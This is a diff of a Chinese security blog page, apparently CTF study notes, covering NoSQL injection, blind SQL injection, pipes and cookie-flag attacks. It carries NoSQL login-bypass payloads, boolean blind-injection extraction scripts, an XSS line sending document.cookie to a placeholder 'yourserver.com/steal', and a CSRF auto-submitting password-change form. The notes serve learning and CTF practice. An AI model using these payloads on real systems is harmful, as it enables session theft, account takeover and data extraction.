@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://Oight.github.io/p/nosql%E6%B3%A8%E5%85%A5/'>
 
-<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="NoSQL注入">
+<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="NoSQL注入">
 <meta property='og:description' content=" NoSQL注入\r意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下\r什么是NoSQL？\rNoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。\n">
 <meta property='og:url' content='https://Oight.github.io/p/nosql%E6%B3%A8%E5%85%A5/'>
 <meta property='og:site_name' content='Oight'>
@@ -382,71 +382,27 @@
 </h4><h5 id="有两种-nosql-注入分类的方式">有两种 NoSQL 注入分类的方式：
 </h5><p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
 <p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">重言式注入
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">联合查询注入
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JavaScript 注入
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">盲注
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">重言式注入
+</span></span></code></pre></div><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">联合查询注入
+</span></span></code></pre></div><p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JavaScript 注入
+</span></span></code></pre></div><p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">盲注
+</span></span></code></pre></div><p>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
 <p>常见的NoSQL为PHP中的NoSQL和Node.js中的NoSQL</p>
 <h5 id="php-中的nosql注入">PHP 中的NoSQL注入
 </h5><p>重言式注入：</p>
 <p>重言式注入通常也是判断是否为NoSQL的第一步。
 我们需要用$ne关键字构造永真条件来完成NoSQL注入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[$ne]=1&amp;password[$ne]=1
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[$ne]=1&amp;password[$ne]=1
+</span></span></code></pre></div><p>最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码
 这里的原理是，$ne关键字在MongoDB查询语句中意思是不等于，也就是说我们上传了一个永真条件，使得登陆成功，但是服务端查不到username是1，password也是1的账户，只能输出所有的账户</p>
 <p>所以我们也可以使用以下的payload：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[$ne]=&amp;password[$ne]=
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[$ne]=&amp;password[$ne]=
 </span></span><span class="line"><span class="cl">username[$gt]=&amp;password[$gt]=
 </span></span><span class="line"><span class="cl">username[$gte]=&amp;password[$gte]=
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>JavaScript注入：</p>
+</span></span></code></pre></div><p>JavaScript注入：</p>
 <p>MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript  进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的  JavaScript 代码，导致非法的数据获取或篡改。</p>
 <p>要想使用JS注入，我们需要了解一下$where操作符。</p>
 <p>在MongoDB中，可以通过$where操作符直接执行JavaScript代码如下实例：</p>
@@ -455,24 +411,10 @@
 { “_id” : ObjectId(“60fa9c80257f18542b68c4b9”), “username” : “whoami”, “password” : “657260” }</p></blockquote>
 <p>由于使用了 $where 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
 <p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 $userData 获取查询条件：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.users.find({ $where: &#34;function(){return(this.username == $userData)}&#34; })
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.users.find({ $where: &#34;function(){return(this.username == &#39;a&#39;; sleep(5000))}&#34; })
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果此时服务器有 5 秒钟的延迟则说明注入成功。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.users.find({ $where: &#34;function(){return(this.username == $userData)}&#34; })
+</span></span></code></pre></div><p>然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.users.find({ $where: &#34;function(){return(this.username == &#39;a&#39;; sleep(5000))}&#34; })
+</span></span></code></pre></div><p>如果此时服务器有 5 秒钟的延迟则说明注入成功。
 值得注意的是，在 MongoDB 2.4 之前，通过 $where 操作符使用<em>map-reduce</em>、<em>group</em> 命令可以访问到 Mongo Shell 中的全局函数和属性，如<em>db</em>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。
 在MongoDB 2.4 之后<em>db</em>访问不到了，但还是可以构造万能密码查出用户信息</p>
 <p>布尔盲注：
@@ -484,52 +426,7 @@
 </h5><p>Node.js中的MongoDB注入主要是重言式注入，通过构造永真式万能密码实现登录绕过
 另外，如果过滤了$ne关键字可以使用Unicode编码绕过。
 在这里贴一个布尔盲注用于爆密码的脚本</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">string</span>
 </span></span><span class="line"><span class="cl">
@@ -570,9 +467,7 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a130</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a1307</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># [+] 42276606202db06ad1f29ab6b4a1307f</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="关于linux中的管道符-">关于Linux中的管道符 |
+</span></span></code></pre></div><h1 id="关于linux中的管道符-">关于Linux中的管道符 |
 </h1><p>管道符在以前RCE的时候也见到过但是没有进行系统研究，最近刷题的时候又遇到了，所以在这里记录一下
 使用|可以将两个命令分隔开来，同时管道符左边命令的输出可以作右边命令的输入
 因此在遇到一些已经可以执行命令（比如Ping）的靶机上，通过|连接cat或find或grep命令来找到flag</p>
@@ -589,64 +484,15 @@
 输入*1’ or 1=1 –+<em>和</em>1;show databases();#*发现均被过滤，而输入1和2的时候登陆成功，输入3以上的数字以及字母都会报错（回显bool flase）
 所以猜测这里需要布尔盲注，同时屏蔽了关键词
 尝试Fuzz一下看看屏蔽了哪些关键词</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这里粘贴一些用于Fuzz的字典
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这里粘贴一些用于Fuzz的字典
 </span></span><span class="line"><span class="cl">https://github.com/Underwood12/FuzzDict
 </span></span><span class="line"><span class="cl">这是Fuzz教程  
 </span></span><span class="line"><span class="cl">https://www.bilibili.com/video/BV1Zs42137tf
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>题目给库名和表名都是flag
+</span></span></code></pre></div><p>题目给库名和表名都是flag
 所以用<em>id=0^(ascii(substr((select(flag)from(flag)),1,1))&gt;101)</em>
 来查询，由于当&gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f
 然后使用脚本</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php&#34;</span>
@@ -681,9 +527,7 @@
 </span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="n">num</span> <span class="o">=</span> <span class="mi">1</span>
 </span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>得到flag</p>
+</span></span></code></pre></div><p>得到flag</p>
 <h1 id="ssti">SSTI
 </h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下
 题目在这：</p>
@@ -718,31 +562,14 @@
 <p>这里详细写一下第一点和第二点</p>
 <p>一、HttpOnly、Secure、SameSite 标志
 我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
 </span></span><span class="line"><span class="cl">Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。
 </span></span><span class="line"><span class="cl">SameSite：如果为None，可能可用于CSRF攻击。  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="1-利用-httponly">1. 利用 HttpOnly
+</span></span></code></pre></div><h4 id="1-利用-httponly">1. 利用 HttpOnly
 </h4><p>开启HttpOnly则禁止通过JavaScript访问Cookie  如果这里是关的，那就可以</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
 </span></span><span class="line"><span class="cl">&lt;script&gt;fetch(&#39;http://yourserver.com/steal?cookie=&#39; + document.cookie);&lt;/script&gt;    
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>通过钓鱼的方式来获取管理员的会话ID</p>
+</span></span></code></pre></div><p>通过钓鱼的方式来获取管理员的会话ID</p>
 <h4 id="2-利用未设置-secure-的-cookie">2. 利用未设置 Secure 的 Cookie
 </h4><p>使用Burp Suite或Wireshark进行抓包。
 在HTTP请求中，寻找Cookie: PHPSESSID=xxxx。
@@ -754,23 +581,12 @@
 </h4><p>如果SameSite标志为None，则跨站请求可以携带会话ID。
 这使得CSRF攻击成为可能。
 在攻击者的网站（比如 http:/ /evil.com）上放置以下表单：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
 </span></span><span class="line"><span class="cl">&lt;form action=&#34;http ://victim.com/change_password.php&#34; method=&#34;POST&#34;&gt;
 </span></span><span class="line"><span class="cl">  &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#34;newpassword123&#34;&gt;
 </span></span><span class="line"><span class="cl">&lt;/form&gt;
 </span></span><span class="line"><span class="cl">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
+</span></span></code></pre></div><p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
 <p>如果SameSite=None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。</p></blockquote>
 
 </section>
@@ -981,6 +797,51 @@
         document.head.appendChild(customFont);
     }());
 </script>
+  <script>
+    (function () {
+      const maxHeight = 420;
 
+      function initCodeFold() {
+        document
+          .querySelectorAll(".article-content .highlight")
+          .forEach(function (block) {
+            if (block.dataset.codeFoldInit === "true") return;
+
+            block.dataset.codeFoldInit = "true";
+
+            if (block.scrollHeight <= maxHeight + 40) return;
+
+            const wrapper = document.createElement("div");
+            wrapper.className = "code-fold-wrapper";
+
+            block.parentNode.insertBefore(wrapper, block);
+            wrapper.appendChild(block);
+
+            block.classList.add("code-collapsible", "code-collapsed");
+
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "code-toggle-button";
+            button.textContent = "展开代码";
+            button.setAttribute("aria-expanded", "false");
+
+            button.addEventListener("click", function () {
+              const collapsed = block.classList.toggle("code-collapsed");
+
+              button.textContent = collapsed ? "展开代码" : "收起代码";
+              button.setAttribute("aria-expanded", String(!collapsed));
+            });
+
+            wrapper.appendChild(button);
+          });
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initCodeFold);
+      } else {
+        initCodeFold();
+      }
+    })();
+  </script>
     </body>
 </html>
